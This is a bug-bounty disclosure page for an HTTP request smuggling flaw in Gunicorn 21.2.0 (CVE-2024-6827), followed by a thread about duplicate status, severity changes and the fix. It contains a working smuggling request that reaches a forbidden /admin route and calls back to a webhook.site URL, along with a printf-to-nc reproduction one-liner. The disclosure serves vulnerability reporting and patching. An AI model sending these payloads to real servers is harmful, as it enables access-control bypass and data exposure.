HTTP Request Smuggling in Gunicorn in benoitc/gunicorn Valid Reported on Mar 19th 2024 Description Gunicorn does not properly validate the value of the 'Transfer-Encoding' header as specified in the RFC standards, which leads to the default fallback method of 'Content-Length,' making it Vulnerable to TE CL request smuggling. Proof of Concept Consider the following dummy application where the /admin route is forbidden by the frontend server. // app.py from flask import Flask, render_template, request, redirect, Response import requests
app = Flask(__name__) @app.before_request def handle_chunking ():
request.environ[ "wsgi.input_terminated" ] = True @app.route( "/admin" ) def reached (): print ( "welcome Admin" ) return "Welcome Admin" @app.route( "/" , methods=[ "GET" , "POST" ] ) def get (): return "HELLO NON-SMUGGLER" if __name__ == "__main__" :
app.run(port= 8000 ) requirements.txt gunicorn = = 21.2 . 0 flask = = 3.0 . 0 gevent = = 23.9 . 1 Exploit POST / HTTP/1.1 Host : 172.24.10.169 Content-Length : 6 Transfer-Encoding : chunked,gzip 73 GET /admin?callback1=https://webhook.site/717269ae- 8b97 - 4866 -9a24-17ccef265a30 HTTP/ 1.1 Host: 172.24 .10 .169 0 In the above exploit, the proxy uses Transfer-Encoding header as "Chunked" is specified in header value and forwards it to the backend server (Gunicorn). However, since Gunicorn has a strict check on the value of Transfer-Encoding, which should be strictly "chunked," check fails and falls back to the Content-Length which is forwarded from the proxy server.Hence making vulnerable to TE.CL Request Smuggling. In easy words the root cause of the issues is as follows: Consider the following request where Gunicorn Uses Content-Length eventhough Transfer-Encoding has precedence. POST / HTTP/1.1 Host : 172.24.10.169 Content-Length : 6 Transfer-Encoding : chunked,gzip While Other servers like llhttp in the above senario handles as per rfc(Transfer-Encoding given precedence) and proceed with Transfer-Encoding, example for same has given here(https://github.com/nodejs/llhttp/blob/763a41761bdf486da8ede45b4fa309e573e1fa7d/test/request/transfer-encoding.md#post-with-chunked-before-other-transfer-coding-lenient) Video POC https://drive.google.com/file/d/1MxB3i8Rzz9rn3H8sa7wP1YO2_aoIGGOW/view?usp=sharing Impact HTTP Request Smuggling (HRS) can lead to cache poisoning, data exposure, session
manipulation, SSRF, XSS, DoS, data integrity compromise, security bypass, information
leakage, and business logic abuse. References request-smuggling We are processing your report and will contact the benoitc/gunicorn team within 24 hours. 9 months ago A GitHub Issue asking the maintainers to create a SECURITY.md exists 9 months ago huntr-helper modified the Severity from Critical (9.9) to Critical (9.8) 9 months ago We have contacted a member of the benoitc/gunicorn team and are waiting to hear back 9 months ago We have sent a  follow up to the benoitc/gunicorn team. We will try again in 4 days. 9 months ago The researcher has received a minor penalty to their credibility for miscalculating the severity: -1 Marcello has marked this vulnerability as a duplicate of 22158e34-cfd5-41ad-97e0-a780773d96c1 9 months ago The disclosure bounty has been dropped The fix bounty has been dropped The researcher's credibility has increased: +7 1nt3rc3pt0r commented 9 months ago Researcher Hey team this is not a duplicate of the following mentioned report https://huntr.com/bounties/22158e34-cfd5-41ad-97e0-a780773d96c1 The report mentioned here is a different vulnerability reported by one of my teammates. To be precise, the cause of my vulnerability is the use of multiple values in the Transfer-Encoding header, "chunked,gzip", where Gunicorn doesn't consider this a valid TE header, while other servers do. On the other hand root cause of https://huntr.com/bounties/22158e34-cfd5-41ad-97e0-a780773d96c1 is  sending of two Transfer-Encoding header one with value "chunked" and other with "xchunked" and proxy server rejects Transfer-Encoding header while gunicorn proceed with Transfer-Encoding as the flag is set from here: https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/message.py#L172 Please reevaluate the root cause and go throuth the report as the root cause of both vulnerablity is different. 1nt3rc3pt0r commented 9 months ago Researcher Kindly go througth both report once again. 1nt3rc3pt0r commented 9 months ago Researcher Hey team, I would like to reevaluate my report(https://huntr.com/bounties/1b4f8f38-39da-44b6-9f98-f618639d0dd7) against the duplicated report (https://huntr.com/bounties/22158e34-cfd5-41ad-97e0-a780773d96c1) by your teammate, as it seems to represent a totally different attack scenario and the cause of both attacks are different. The report (https://huntr.com/bounties/22158e34-cfd5-41ad-97e0-a780773d96c1) mentioned here is a different vulnerability reported by one of my teammates. To be precise, the cause of my vulnerability(https://huntr.com/bounties/1b4f8f38-39da-44b6-9f98-f618639d0dd7) is the use of multiple comma separated values in the Transfer-Encoding header, "chunked,gzip", where Gunicorn doesn't consider this a valid TE header, while other servers do.
Making it vulnerable to TE.CL On the other hand root cause of https://huntr.com/bounties/22158e34-cfd5-41ad-97e0-a780773d96c1 is sending of two Transfer-Encoding header one with value "chunked" and other with "xchunked" and proxy server rejects Transfer-Encoding header while gunicorn proceed with Transfer-Encoding as the flag is set from here: https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/message.py#L172.
Making it vulnerable to CL.TE Dan McInerney commented 9 months ago Admin Hi 1nt3rc3pt0r, Marcello and I re-reviewed and we're pretty sure you're correct, this likely isn't a duplicate. We're going to reset to Pending for the time being. Thanks! A huntr admin reset this report to a pending state. 9 months ago 1nt3rc3pt0r commented 9 months ago Researcher Thanks Dan McInerney and Marcello. I really appreciate that We have sent a second follow up to the benoitc/gunicorn team. We will try again in 7 days. 9 months ago We have sent a third follow up to the benoitc/gunicorn team. We will try again in 14 days. 9 months ago We have sent a fourth follow up to the benoitc/gunicorn team. We will send a final notification 48 hours before report publication. 8 months ago 1nt3rc3pt0r commented 8 months ago Researcher Team any updates on this? We have sent a magic link to the benoitc/gunicorn team via the email provided in their security policy 7 months ago benoitc commented 7 months ago Maintainer this issue is investigated. Please note however that the recommended way to use Gunicorn is behind a  proxy.  plrase extend the release untile the 1/06  a new release of gunicorn is planned this week. A benoitc/gunicorn maintainer has acknowledged this report 7 months ago The scheduled publication date was automatically extended from 18th Jun 2024  to 25th Jun 2024  due to the maintainers acknowledgement of the report 7 months ago 1nt3rc3pt0r commented 7 months ago Researcher Thanks benoitc, Let me know once the fix is ready so i can revalidate it. Dan McInerney modified the Severity from Critical (9.8) to High (7.5) 6 months ago Dan McInerney set the scheduled publication date to Jul 1st 2024 UTC 6 months ago Dan McInerney commented 6 months ago Admin @benoitc, what date is 1/06 referring to? I see the latest version hasn't been released yet so I'm extending to July 1st, 2024 for now, am happy to edit this. A huntr admin modified the scheduled publication date from 30th Jun 2024 to 11th Jul 2024 6 months ago Dan McInerney commented 6 months ago Admin I don't see a new gunicorn release yet, but since maintainer acknowledged investigation I'm going to extend the publication again. Dan McInerney set the scheduled publication date to Jul 25th 2024 UTC 6 months ago The researcher has received a minor penalty to their credibility for miscalculating the severity: -1 Marcello validated this vulnerability 5 months ago Gunicorn 22.0 seems to have been released in April. Marking as valid. sayoojbkumar has been awarded the disclosure bounty The fix bounty is now up for grabs The researcher's credibility has increased: +7 CVE-2024-6827 assigned to this report. 5 months ago We have sent a warning to the benoitc/gunicorn team to inform them that this report will be published in 48 hours 5 months ago This vulnerability has now been published 5 months ago williamroynelson commented 4 months ago I wrote to the unicorn maintainer last week and  Benoît said that he fixed the problem and it would be part of the 23.0.0 release, which came out on 2024-08-10. I don't see the fix in the change log, and I'm not quite savvy enough to reproduce the POC above to check for myself if the problem is actually fixed or not. Could someone please perform a verification on 23.0.0 so that it's clear whether or not this vulnerability is still present? 1nt3rc3pt0r commented 4 months ago Researcher looks like this is fixed williamroynelson.
https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/message.py#L181 Daniel Oliveira commented 4 months ago I was able to reproduce the issue with gunicorn:21.2.0 . Sending the same request with gunicorn:23.0.0 results in the following message: [2024-08-19 18:43:45 -0400] [22203] [ WARNING ] Invalid request from ip =127.0.0.1: Invalid HTTP Header: 'TRANSFER-ENCODING' To reproduce, I just used printf: printf 'POST / HTTP/1.1\r \n Host: localhost\r \n Content-Length: 6\r \n Transfer-Encoding: chunked,gzip\r \n \r \n 73\r \n \r \n GET /admin HTTP/1.1\r \n Host: localhost\r \n \r \n 0' | nc localhost 8000 The first POST request needs Content-Length: 6 so that gunicorn interprets 73\r\n\r\n as a chunked body and continues to parse GET /admin ... as a new request. Using flag --worker-class=gevent was necessary, but --workers=2 was not. Sign in to join this conversation
CVE CVE-2024-6827 (assigned, under review) Vulnerability Type CWE-444:  HTTP Request Smuggling Severity High (7.5) Attack vector Network Attack complexity Low Privileges required None User interaction None Scope Unchanged Confidentiality High Integrity None Availability None Open in visual CVSS calculator Registry Pypi Affected Version 21.2.0 Visibility Public Status Awaiting fix Disclosure Bounty $750 Fix Bounty $187.5 Found by 1nt3rc3pt0r @sayoojbkumar UNPROVEN